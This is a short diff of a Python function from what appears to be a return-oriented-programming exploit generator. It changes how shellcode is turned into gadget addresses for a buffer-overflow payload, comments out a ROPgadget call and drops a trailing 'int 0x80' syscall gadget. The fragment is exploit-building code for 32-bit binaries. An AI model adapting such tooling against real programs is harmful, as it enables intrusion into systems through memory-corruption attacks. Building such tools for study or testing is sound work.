@@ -152,24 +152,24 @@ def createROPchain(command, bufflength):
 def makeROPchain(shellcode, bufflength):
 
     #Find ROP gadgets
-    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
+    #os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
 
     #Write Shellcode as gadgets
     dictionary = {}
     ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
     gadgets = dictionary.keys()
     payload = ReverseExecution.create(shellcode, gadgets)
-    for i, _ in enumerate(payload):
-        if type(payload[i]) is bytes:
-            payload[i] = payload[i]
-            continue
-        if payload[i][0] == '@':
-            payload[i] = ReverseExecution.generalToBytes(ROPcompile.dataaddressToValue(payload[i]) + 0x080da060)
-            continue
-        payload[i] = ReverseExecution.generalToBytes(int(dictionary.get(payload[i]),0))
+    #for i, _ in enumerate(payload):
+        #if type(payload[i]) is bytes:
+            #payload[i] = payload[i]
+            #continue
+        #if payload[i][0] == '@':
+            #payload[i] = ReverseExecution.generalToBytes(ROPcompile.dataaddressToValue(payload[i]) + 0x080da060)
+            #continue
+        #payload[i] = ReverseExecution.generalToBytes(int(dictionary.get(payload[i]),0))
+    #bpayload = b''.join(payload)
+    bpayload = ROPcompile.AssemblyListToGadgets(payload, bufflength, dictionary)
     print(payload)
-    bpayload = b''.join(payload)
-    bpayload += ReverseExecution.generalToBytes(int(dictionary.get("int 0x80"),0))
     print(bpayload)
 
     #Write the payload
